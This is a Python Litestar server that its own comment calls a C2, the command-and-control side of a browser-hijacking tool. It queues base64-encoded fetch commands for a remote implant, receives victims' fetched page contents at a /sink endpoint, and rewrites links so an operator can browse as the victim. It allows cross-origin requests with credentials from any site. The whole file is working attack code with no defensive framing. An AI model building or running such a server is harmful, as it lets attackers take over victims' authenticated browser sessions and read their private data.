from __future__ import annotations

import asyncio
import base64
import re
from copy import deepcopy
from urllib.parse import unquote, quote_plus

from litestar import Litestar, get, MediaType
from litestar.config.cors import CORSConfig
from litestar.response import Redirect

href_regex: re.Pattern[str] = re.compile("href=(['\"][^'\" >]+['\"])")
current_commands: list[str] = []
current_results: list[str] = []
current_sink: str | None = None


def command_to_b64(command: str) -> str:
    return base64.b64encode(command.encode("latin1")).decode()


def b64_to_str(data: str) -> str:
    return base64.b64decode(data).decode("latin1")


@get("/")
async def hello() -> str:  # noqa: UP006
    return (
        f"Current commands:"
        f" {[b64_to_str(d) for d in current_commands]}"
        f"\n\nRaw: {current_commands}\n\n"
        f"Received results: {current_results}"
    )


@get("/commands")
async def get_commands() -> dict[str, list[str]]:
    if current_sink is None:
        current_commands.append(command_to_b64(f"FETCH|GET|/"))

    data = {"data": deepcopy(current_commands)}
    current_commands.clear()
    return data


@get("/commands/add/get_target")
async def add_fetch(target: str, method: str = "GET") -> Redirect:
    target = (
        target.removeprefix("'").removeprefix('"').removesuffix("'").removesuffix('"')
    )
    current_commands.append(command_to_b64(f"FETCH|{method}|{target}"))

    # Wait till the C2 had a chance to
    # run the command then show the new page
    await asyncio.sleep(1.1)
    return Redirect("/remote_page")


@get("/sink")
async def receive_sink(r: str) -> None:
    response = unquote(r)
    global current_sink

    # First we need to replace all clicks with command calls
    for href in href_regex.findall(response):
        response = response.replace(
            href, f"'/commands/add/get_target?target={quote_plus(href)}'"
        )

    current_sink = response
    return None


@get("/remote_page", media_type=MediaType.HTML)
async def show_current_sink() -> str:
    if current_sink is None:
        return "No page to view"

    return current_sink


cors_config = CORSConfig(
    allow_origins=["*"],
    allow_headers=["*"],
    allow_methods=["*"],
    allow_credentials=True,
)
app = Litestar(
    cors_config=cors_config,
    route_handlers=[hello, get_commands, add_fetch, receive_sink, show_current_sink],
)
